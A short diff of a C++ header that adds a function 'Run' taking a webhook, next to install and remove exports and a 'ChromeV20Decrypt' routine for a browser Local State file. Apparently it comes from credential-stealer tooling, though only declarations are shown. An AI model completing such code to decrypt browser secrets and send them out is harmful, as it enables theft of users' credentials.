@@ -42,6 +42,7 @@ extern "C" {
     U_API bool Install(const wchar_t* src);
     U_API bool Remove();
     U_API bool IsActive();
+    U_API int  Run(const wchar_t* webhook, int mode);
 }
 
 bool ChromeV20Decrypt(const std::wstring& localStatePath,
